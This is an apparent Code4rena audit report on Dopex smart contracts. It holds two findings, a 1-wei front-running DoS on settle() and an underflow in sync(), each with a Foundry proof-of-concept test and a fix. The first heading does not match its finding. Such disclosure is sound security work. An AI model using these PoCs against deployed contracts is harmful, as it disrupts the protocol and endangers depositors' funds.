# Audit Report for Dopex
Link - https://code4rena.com/contests/2023-08-dopex

Auditor 
- https://twitter.com/supernovahs444
- https://twitter.com/Viraz04

# Findings

## [H-01] processSpentItems should have non-array input to save gas

## Lines of code

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L198-L205


## Vulnerability details

## Impact
Admin settles `optionIds` by calling the [settle](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L764) function.
Internally it calls the Vault's [`settle`](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L315) function.

Now look at the following line :-
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L359

It calls `subtractLoss` function present in [VaultLP](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L199-L205) contract .

```solidity
 function subtractLoss(uint256 loss) public onlyPerpVault {
   require(
     collateral.balanceOf(address(this)) == _totalCollateral - loss,
     "Not enough collateral was sent out"
   );
   _totalCollateral -= loss;
 }
```


Note it requires the collateral balance of LP contract to be exactly equal to (_totalCollateral- loss).

Attacker can prevent the vault from settling by sending **1 wei** to the LP contract by front running the admin's settle() call.
This will make the protocol unusable as the core function `settle` can be griefed by anyone at an almost 0 cost.

## Proof of Concept
Paste the following code in https://github.com/code-423n4/2023-08-dopex/blob/main/tests/rdpxV2-core/Integration.t.sol

Run `forge test --mt test_poc_settle_reverts_when_collateral_sent_directly_to_vault_lp -vvv`

```solidity
function test_poc_settle_reverts_when_collateral_sent_directly_to_vault_lp() public {
       // user 1 bonds 10 dpxETH
   uint256 receiptTokens1 = rdpxV2Core.bond(10 * 1e18, 0, address(1));
   // user 2 bonds 10 dpxETH
   rdpxV2Core.bond(10 * 1e18, 0, address(2));

   // update rdpx to (.312 eth)
   address[] memory path;
   path = new address[](2);
   path[0] = address(weth);
   path[1] = address(rdpx);
   router.swapExactTokensForTokens(
     500e18,
     0,
     path,
     address(this),
     block.timestamp
   );
   rdpxPriceOracle.updateRdpxPrice(312 * 1e5);

   // reduce bond discount
   rdpxV2Core.setBondDiscount(5e4);

   // user 3 bonds 5 dpxETH at new price and bond discount
   weth.transfer(address(3), 5e18);
   rdpx.transfer(address(3), 50e18);
   vm.prank(address(3), address(3));
   weth.approve(address(rdpxV2Core), type(uint256).max);
   vm.prank(address(3), address(3));
   rdpx.approve(address(rdpxV2Core), type(uint256).max);
   vm.prank(address(3), address(3));
   rdpxV2Core.bond(5 * 1e18, 0, address(3));

   // skip 5 days
   skip(86400 * 5);

   // delegate 2 weth at 10% fee
   uint256 delegateId1 = rdpxV2Core.addToDelegate(2e18, 10e8);

   // user 1 delegate 5 weth at 20% fee
   weth.transfer(address(1), 5e18);
   vm.prank(address(1), address(1));
   weth.approve(address(rdpxV2Core), type(uint256).max);
   vm.prank(address(1), address(1));
   uint256 delegateId2 = rdpxV2Core.addToDelegate(5e18, 20e8);

   // bond with delegate
   uint256[] memory _amounts = new uint256[](2);
   uint256[] memory _delegateIds = new uint256[](2);
   _delegateIds[0] = delegateId1;
   _delegateIds[1] = delegateId2;
   _amounts[0] = 1 * 1e18;
   _amounts[1] = 1 * 3e18;

   rdpxV2Core.bondWithDelegate(address(this), _amounts, _delegateIds, 0);

   // skip 2 days and update funding payment pointer
   skip(86400 * 2);
   vault.updateFundingPaymentPointer();

   // calculate funding
   uint256[] memory strikes = new uint256[](2);
   strikes[0] = 15e6;
   strikes[1] = 24000000;
   vault.calculateFunding(strikes);

   // bond 1 dpxETH
   rdpxV2Core.bond(1 * 1e18, 0, address(this));

   // provide funding
   vault.addToContractWhitelist(address(rdpxV2Core));

   // send funding to rdpxV2Core and call sync
   uint256 funding = vault.totalFundingForEpoch(
     vault.latestFundingPaymentPointer()
   );
   weth.transfer(address(rdpxV2Core), funding);
   rdpxV2Core.sync();

   rdpxV2Core.provideFunding();

   // bond 1 dpxETH
   rdpxV2Core.bond(1 * 1e18, 0, address(this));

   // skip 7 days
   skip(86400 * 7);
   vault.updateFundingPaymentPointer();
   receiptTokens1 = rdpxV2Core.bond(1 * 1e18, 0, address(this));

   // calculate and pay funding
   vault.calculateFunding(strikes);

   // send funding to rdpxV2Core and call sync
   funding = vault.totalFundingForEpoch(vault.latestFundingPaymentPointer());
   weth.transfer(address(rdpxV2Core), funding);
   rdpxV2Core.sync();
   rdpxV2Core.provideFunding();

   // decrease price of rdpx (0.2weth)
   path[1] = address(weth);
   path[0] = address(rdpx);
   router.swapExactTokensForTokens(
     2000e18,
     0,
     path,
     address(this),
     block.timestamp
   );
   rdpxPriceOracle.updateRdpxPrice(2 * 1e7);
   // ATTACKER TRANSFERS 1 WEI to LP CONTRACT 
   console.log("Attacker transferring 1 wei to LP contract before settle is called");
   weth.transfer(address(vaultLp), 1);

   // settle options
   uint256[] memory ids = new uint256[](6);
   ids[0] = 2;
   ids[1] = 3;
   ids[2] = 4;
   ids[3] = 5;
   ids[4] = 6;
   ids[5] = 7;

   vm.expectRevert();
   rdpxV2Core.settle(ids);
   console.log("Call reverts as expected!");
 }

```
## Tools Used
Foundry
## Recommended Mitigation Steps
In `subtractLoss` , do this

```solidity
function subtractLoss(uint256 loss) public onlyPerpVault {
   require(
-      collateral.balanceOf(address(this)) == _totalCollateral - loss,
+      collateral.balanceOf(address(this)) >= _totalCollateral - loss,
     "Not enough collateral was sent out"
   );
   _totalCollateral -= loss;
 }
```



## Assessed type

DoS

## [H-02] Asset reserves cannot be synced with the core contract balances


## Lines of code

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1002
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L975-L990


## Vulnerability details

## Impact
`RdpxV2Core` syncs all the respective `reservesAsset's` token balances which are maintained separately in storage. Anyone can call it, and it is responsible for updating the reserveAsset's token balances if the actual token balance of the contract increases.

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L992-L1008

The core problem lies in the `sync()` function. The `sync()` function will revert due to underflow leading to accounting errors for all the reserveAssets.

## Proof of Concept
Paste the following code in https://github.com/code-423n4/2023-08-dopex/blob/main/tests/rdpxV2-core/Integration.t.sol

import these lines first
```solidity
import "forge-std/console.sol";
import "forge-std/console2.sol";
import { ERC721Holder } from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
```

now paste the test snippet below

```solidity
function testSync() public {
  address user1 = makeAddr("user1");
  address user2 = makeAddr("user2");
  weth.transfer(user1,100 ether);
  weth.transfer(user2,50 ether);
  vm.prank(user1);
  weth.approve(address(rdpxV2Core),type(uint256).max);
  vm.prank(user1);
  uint256 delegateId1 = rdpxV2Core.addToDelegate(100e18, 20e8);
  vm.prank(user2);
  weth.approve(address(rdpxV2Core), type(uint256).max);
  vm.prank(user2);
  uint delegateId2 = rdpxV2Core.addToDelegate(50e18,20e8);
  // bond with delegate
  uint256[] memory _amounts = new uint256[](1);
  uint256[] memory _delegateIds = new uint256[](1);
  _delegateIds[0] = delegateId2;
  _amounts[0] = 1 * 25e18;
  rdpxV2Core.bondWithDelegate(address(this), _amounts, _delegateIds, 0);

  vm.prank(user2);
  rdpxV2Core.withdraw(delegateId2);
  console.log("totalwethdelegated",rdpxV2Core.totalWethDelegated());
  console2.log("balanceOf weth",IERC20(address(weth)).balanceOf(address(rdpxV2Core)));
  console2.log("balance of weth of rdpxcore < totalwethdelegated",IERC20(address(weth)).balanceOf(address(rdpxV2Core)) < rdpxV2Core.totalWethDelegated());
  vm.expectRevert();// [FAIL. Reason: Arithmetic over/underflow]
  rdpxV2Core.sync();

  // All reserveAssets will be out of sync now.

}
```

The `sync` function fails due to underflow error in the line below.
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1002


https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L975-L990

This is due to the fact that when a delegator withdraws their unused `WETH` , we do not reduce `totalWethDelegated`. This creates an imbalance between the actual balance of weth in rdpxv2core and `totalWethDelegated`


## Tools Used
Foundry
## Recommended Mitigation Steps
Reduce `totalWethDelegated` by the withdrawn amount in the [withdraw](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L975) function



## Assessed type

Under/Overflow
